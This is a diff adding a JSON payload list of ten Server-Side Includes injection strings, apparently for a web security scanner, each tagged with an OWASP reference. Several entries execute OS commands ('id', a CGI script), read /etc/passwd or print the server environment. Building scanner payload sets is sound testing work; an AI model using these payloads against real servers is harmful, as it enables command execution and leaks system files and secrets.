@@ -1,0 +1,62 @@
+[
+  {
+    "id": "ssi-001", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#exec cmd=\"id\"-->", "context": "string",
+    "description": "SSI Injection - OS Command (id)",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-002", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#include virtual=\"/etc/passwd\"-->", "context": "string",
+    "description": "SSI Injection - File inclusion (virtual)",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-003", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#include file=\"/etc/passwd\"-->", "context": "string",
+    "description": "SSI Injection - File inclusion (file)",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-004", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#echo var=\"DATE_LOCAL\"-->", "context": "string",
+    "description": "SSI Injection - Date echo",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-005", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#printenv-->", "context": "string",
+    "description": "SSI Injection - Print environment",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-006", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#exec cgi=\"/cgi-bin/test.cgi\"-->", "context": "string",
+    "description": "SSI Injection - CGI execution",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-007", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#set var=\"injection\" value=\"injected_ssi_1337\"--><!--#echo var=\"injection\"-->", "context": "string",
+    "description": "SSI Injection - Set and echo variable",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-008", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#config errmsg=\"[SSI_ERROR_INJECTED]\"--><!--#include virtual=\"/nonexistent\"-->", "context": "string",
+    "description": "SSI Injection - Custom error message leak",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-009", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#echo var=\"DOCUMENT_URI\"-->", "context": "string",
+    "description": "SSI Injection - Document URI echo",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "ssi-010", "family": "ssi_injection", "subtype": "ssi_injection",
+    "payload_string": "<!--#echo var=\"HTTP_USER_AGENT\"-->", "context": "string",
+    "description": "SSI Injection - User-Agent echo",
+    "references": ["https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"], "platform_specific": {}
+  }
+]
